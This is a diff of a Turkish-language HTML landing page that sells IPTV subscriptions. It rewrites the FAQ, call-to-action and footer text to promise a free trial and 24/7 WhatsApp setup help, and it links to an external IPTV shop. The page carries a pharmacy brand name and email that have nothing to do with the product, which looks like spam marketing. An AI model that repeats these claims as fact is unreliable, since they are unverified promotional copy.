               <li class="grid gap-4 py-7 sm:grid-cols-[3rem_1fr]" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
                 <span class="font-display text-2xl font-bold text-ember">06</span>
                 <div>
-                  <h3 class="text-lg font-bold" itemprop="name">Kullanıcı adını paylaşmak yayını keser mi?</h3>
+                  <h3 class="text-lg font-bold" itemprop="name">Kurulum desteği veriliyor mu?</h3>
                   <div itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
-                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Eşzamanlı oturum sınırı aşılırsa yayın kesilebilir. İkinci ekran aynı anda izlenecekse bu sayı sipariş anında belirtilmelidir.</p>
+                    <p class="mt-2 text-sm leading-relaxed text-mute" itemprop="text">Kesinlikle. WhatsApp ve canlı destek üzerinden cihaz modelinize göre adım adım kurulum yardımı sağlıyoruz. Teknik bilgi gerektirmeden 5-10 dakikada izlemeye başlayabilirsiniz.</p>
                   </div>
                 </div>
               </li>
@@ -327,11 +378,11 @@
         </section>
 
         <section id="iletisim" class="px-4 py-16">
-          <h2 class="font-display text-3xl font-bold sm:text-4xl">Hesabı ekranınıza yazdırın</h2>
-          <p class="mt-4 max-w-xl text-lg leading-relaxed text-mute">TV modelini ve kaç ekranın aynı anda açık kalacağını belirtin. Önce 2 saatlik testi, ardından süreyi seçebilirsiniz.</p>
+          <h2 class="font-display text-3xl font-bold sm:text-4xl">Hemen başlayın</h2>
+          <p class="mt-4 max-w-xl text-lg leading-relaxed text-mute">Önce ücretsiz test ile deneyin, beğenirseniz paketinizi seçin. 7/24 canlı destek ekibimiz kurulumdan izlemeye kadar yanınızda.</p>
           <div class="mt-8 flex flex-wrap gap-3">
-            <a href="https://iptvsatinaldimke.vip/" class="bg-ember px-6 py-3 text-sm font-bold text-white hover:bg-orange-800">IPTV satın al</a>
-            <a href="mailto:contact@frankrosspharmacy.in" class="border border-ink px-6 py-3 text-sm font-bold hover:border-ember hover:text-ember">E-posta</a>
+            <a href="https://iptvsatinaldimke.vip/" class="bg-ember px-6 py-3 text-sm font-bold text-white hover:bg-orange-800">Ücretsiz test al</a>
+            <a href="mailto:contact@frankrosspharmacy.in" class="border border-ink px-6 py-3 text-sm font-bold hover:border-ember hover:text-ember">Destek için yazın</a>
           </div>
         </section>
       </div>
@@ -341,7 +392,7 @@
       <div class="mx-auto grid max-w-6xl gap-10 px-4 md:grid-cols-3">
         <div>
           <p class="font-display text-xl font-bold text-paper">frankrosspharmacy</p>
-          <p class="mt-3 text-sm leading-relaxed text-sand/70">İnternet üzerinden canlı yayın rehberi. IPTV satın al arayanlar için hesap, hat ve ekran eşleşmesi.</p>
+          <p class="mt-3 text-sm leading-relaxed text-sand/70">Donmasız IPTV yayın platformu. Hesap kurulumu, cihaz uyumu ve 7/24 teknik destek.</p>
         </div>
         <div>
           <p class="text-xs font-bold uppercase tracking-widest text-orange-300">İletişim</p>
@@ -350,9 +401,9 @@
         <div>
           <p class="text-xs font-bold uppercase tracking-widest text-orange-300">Bölümler</p>
           <ul class="mt-3 space-y-2 text-sm">
-            <li><a href="#tanim" class="hover:text-paper">Yayın tanımı</a></li>
-            <li><a href="#sureler" class="hover:text-paper">Süre seçimi</a></li>
-            <li><a href="#sss" class="hover:text-paper">Sorular</a></li>
+            <li><a href="#tanim" class="hover:text-paper">IPTV nedir?</a></li>
+            <li><a href="#sureler" class="hover:text-paper">Paket fiyatları</a></li>
+            <li><a href="#sss" class="hover:text-paper">Sık sorulanlar</a></li>
           </ul>
         </div>
       </div>
